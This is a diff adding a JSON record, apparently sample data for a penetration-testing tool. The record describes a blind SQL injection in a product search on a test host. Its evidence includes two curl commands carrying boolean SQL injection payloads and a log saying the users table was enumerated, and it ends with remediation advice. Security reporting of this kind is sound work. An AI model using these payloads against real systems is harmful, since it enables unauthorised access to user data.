@@ -1,0 +1,42 @@
+[
+  {
+    "id": "vuln_a1b2c3",
+    "campaign_id": "camp_20260930_ab12cd34",
+    "project_id": "proj_7f3e21",
+    "target_id": "tgt_0a1b2c",
+    "node_id": "svc_tgt0a1b2c_443_tcp",
+    "title": "Boolean-based blind SQL injection in product search",
+    "severity": "high",
+    "cvss_score": 8.6,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
+    "cve": "CVE-2026-55512",
+    "category": "sql_injection",
+    "mitre_attack_id": "T1190",
+    "mitre_attack_name": "Exploit Public-Facing Application",
+    "iso27001_control": "A.8.28",
+    "status": "exploited",
+    "description": "The `q` parameter of the product search is concatenated into a SQL query, allowing boolean-based blind injection that exfiltrates the users table.",
+    "evidence": {
+      "commands": [
+        "curl -s 'https://shop.example.test/search?q=shoes%27%20AND%201=1--'",
+        "curl -s 'https://shop.example.test/search?q=shoes%27%20AND%201=2--'"
+      ],
+      "payloads": [],
+      "raw_request": "GET /search?q=shoes%27%20AND%201=1-- HTTP/1.1\nHost: shop.example.test\nAccept: */*",
+      "raw_response": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<div class=\"results\">12 results</div>",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "[10:12:41] baseline request sent, 12 results",
+        "[10:12:42] AND 1=1 -> 12 results, AND 1=2 -> 0 results, injection confirmed",
+        "[10:13:05] enumerated users table (3 rows)"
+      ],
+      "explanation": "The two payloads returned different result sets, confirming injection, then the users table was enumerated character by character."
+    },
+    "remediation": "Use parameterised queries / prepared statements for all database access.",
+    "plugin_or_component": "search-controller",
+    "endpoint": "https://shop.example.test/search?q=shoes",
+    "discovered_by_agent": "php",
+    "discovered_at": "2026-09-30T10:13:05Z"
+  }
+]
